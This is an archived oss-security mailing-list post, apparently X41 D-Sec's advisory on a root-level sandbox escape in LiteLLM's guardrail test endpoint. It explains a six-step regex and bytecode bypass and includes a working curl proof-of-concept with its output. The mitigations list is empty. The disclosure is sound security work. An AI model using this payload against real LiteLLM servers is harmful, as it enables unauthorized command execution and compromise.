@@ -1,0 +1,308 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - X41 Advisory X41-2026-001: Guardrail Sandbox Escape in LiteLLM</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="../../../2026/04/08/14">[&lt;prev]</a> <a href="2">[next&gt;]</a> <a href="../../../2026/04/10/2">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;c8e0642f-cf20-4310-84d0-da223e5b16ed&#64;x41-dsec.de&gt;
+Date: Thu, 9 Apr 2026 00:51:06 +0200
+From: Markus Vervier &lt;markus.vervier&#64;...-dsec.de&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: X41 Advisory X41-2026-001: Guardrail Sandbox Escape in LiteLLM
+
+X41 D-Sec GmbH Security Advisory: X41-2026-001
+
+Guardrail Sandbox Escape in LiteLLM
+======================
+
+Severity Rating: High
+
+Confirmed Affected Versions: main-latest (docker image 
+ghcr.io/berriai/litellm:main-latest, repo digest 
+ghcr.io/berriai/litellm&#64;...256:bb0639701796218a3447160e55c0f1097446e4e6085df7dfd39f476d4143743f)
+
+Confirmed Patched Versions: N/A
+
+Vendor: BerriAI
+
+Vendor URL: <a href="https://github.com/BerriAI/litellm" rel="nofollow">https://github.com/BerriAI/litellm</a>
+
+Vendor Reference: N/A
+
+Vector: Authenticated HTTP API request
+
+Credit: X41 D-Sec GmbH, Markus Vervier
+
+Status: Public
+
+CVE: N/A
+
+CWE: CWE-94 (Improper Control of Generation of Code / Code Injection)
+
+CVSS Score: 8.7
+
+CVSS Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+
+Advisory URL: &lt;<a href="https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm/" rel="nofollow">https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm/</a>&gt;
+
+Summary and Impact
+==================
+
+The LiteLLM proxy exposes a /guardrails/test_custom_code API endpoint 
+that allows authenticated users to submit arbitrary Python code for 
+guardrail testing. The endpoint attempts to restrict dangerous 
+operations using regex-based source code filtering but this can be 
+bypassed using bytecode rewriting techniques to achieve arbitrary code 
+execution on the server.
+
+An authenticated attacker can exploit this vulnerability to execute 
+arbitrary commands as the user the LiteLLM process runs as (root in the 
+default Docker image).
+
+Product Description
+===================
+
+LiteLLM is an open-source LLM proxy that provides a unified 
+OpenAI-compatible API for over 100 LLM providers. It supports features 
+such as load balancing, cost tracking, rate limiting, and guardrails for 
+input/output filtering. The guardrails feature allows administrators to 
+define custom Python code that is executed to filter or transform LLM 
+requests and responses.
+
+Analysis
+========
+
+The /guardrails/test_custom_code endpoint accepts a JSON body containing 
+a custom_code field with Python source code and a test_input field. The 
+server executes the provided Python function in a restricted environment 
+that uses regex-based filtering to block access to dangerous attributes 
+and built-in functions. However, this filtering operates only on the 
+source code level and can be bypassed through a combination of string 
+concatenation and CPython bytecode manipulation techniques.
+
+The bypass works in 6 steps:
+
+Step 1 — Regex bypass via string concatenation: Blocked attribute names 
+such as __globals__, __builtins__, and __import__ are constructed at 
+runtime using string concatenation (e.g. "_"+"_gl"+"ob"+"als"+"_"+"_"). 
+Since the regex filter matches literal strings in the source code, the 
+concatenated form is not detected.
+
+Step 2 — Obtain the object class: The object base class is obtained via 
+str.mro()[1] instead of using __class__, which is blocked by the filter.
+
+Step 3 — Access generator code object: A generator function is defined 
+and its code object is accessed via the gi_code attribute, which is not 
+blocked. The code.replace(co_names=...) method is then used to rewrite 
+the bytecode's name table, changing which attributes the bytecode will 
+access at runtime.
+
+Step 4 — Swap function code: object.__setattr__() is used to replace the 
+generator function's __code__ attribute with the rewritten code object. 
+The __code__ attribute name is constructed dynamically to avoid the 
+regex filter.
+
+Step 5 — Extract real builtins: The modified generator function is 
+called with http_get (a function available in the sandbox environment) 
+as argument. The rewritten bytecode accesses 
+http_get.__globals__["__builtins__"]["__import__"], extracting the real 
+__import__ function from the unrestricted builtins.
+
+Step 6 — Achieve RCE: With access to __import__, the attacker imports os 
+and executes arbitrary commands: __import__("os").popen("id").read() 
+returns uid=0(root) in the default Docker deployment.
+
+Proof of Concept
+================
+
+The following sets up a vulnerable test environment:
+
+     docker run -d --name litellm -p 4000:4000 -e 
+LITELLM_MASTER_KEY=sk-litellm-master-key ghcr.io/berriai/litellm:main-latest
+
+
+The following curl command triggers the sandbox escape and executes the 
+id command on the server:
+
+     curl -s -X POST \
+       -H "Authorization: Bearer sk-litellm-master-key" \
+       -H "Content-Type: application/json" \
+       http://localhost:4000/guardrails/test_custom_code \
+       -d '{
+         "custom_code": "def apply_guardrail(inputs, request_data, 
+input_type):\n    obj = str.mro()[1]\n    def g(fn):\n        yield 
+fn.placeholder\n    c = g(None).gi_code\n    gn = 
+\"_\"+\"_gl\"+\"ob\"+\"als\"+\"_\"+\"_\"\n    cn = 
+\"_\"+\"_co\"+\"de_\"+\"_\"\n    obj.__setattr__(g, cn, 
+c.replace(co_names=(gn,)))\n    for v in g(http_get):\n        gd = v\n  
+       break\n    bn = \"_\"+\"_bu\"+\"ilt\"+\"ins\"+\"_\"+\"_\"\n    
+imp = gd[bn][\"_\"+\"_im\"+\"po\"+\"rt_\"+\"_\"]\n    return {\"rce\": 
+imp(\"os\").popen(\"id\").read()}",
+         "test_input": {"messages": [{"role": "user", "content": "test"}]}
+       }'
+
+
+The server responds with the output of the id command, confirming code 
+execution as root:
+
+     {"success":true,"result":{"rce":"uid=0(root) gid=0(root) 
+groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n"},"error":null,"error_type":null}
+
+
+Workarounds
+===========
+
+No vendor patch is available at the time of publication. Users could 
+apply the following mitigations:
+
+Timeline
+========
+
+2026-02-13 Issue identified, PoC created
+2026-02-18 LiteLLM acknowledged, giving an initial ETA for fix: by the 
+end of next week
+2026-03-20 Follow-up sent for patch status and disclosure coordination
+2026-03-24 Urgent follow-up sent, delivery failure received for 
+technical contact's email
+2026-03-25 Looped in distros mailing list and additional contacts at berry
+2026-03-26 Berry acknowledged the report receipt again
+2026-04-06 Berry acknowledged the report again and asked to submit via 
+their GitHub security reporting page
+2026-04-07 X41 and distros clarified the embargo runs out on 2026-04-08
+2026-04-08 Distros maximum embargo expired, publication
+
+About X41 D-Sec GmbH
+====================
+
+X41 is an expert provider for application security services.
+Having extensive industry experience and expertise in the area of 
+information
+security, a strong core security team of world class security experts 
+enables
+X41 to perform premium security services.
+
+Fields of expertise in the area of application security are security 
+centered
+code reviews, binary reverse engineering and vulnerability discovery.
+Custom research and IT security consulting and support services are core
+competencies of X41.
+
+
+<span style="font-family: times;"><strong>View attachment "</strong><a href="1/1">x41-2026-001-litellm.txt.asc</a><strong>" of type "</strong>text/plain<strong>" (7559 bytes)</strong></span>
+
+<span style="font-family: times;"><strong>Download attachment "</strong><a href="1/2" rel="nofollow" download>OpenPGP_0x5C5642C317AD0166.asc</a><strong>" of type "</strong>application/pgp-keys<strong>" (5614 bytes)</strong></span>
+
+<span style="font-family: times;"><strong>Download attachment "</strong><a href="1/3" rel="nofollow" download>OpenPGP_signature.asc</a><strong>" of type "</strong>application/pgp-signature<strong>" (841 bytes)</strong></span>
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
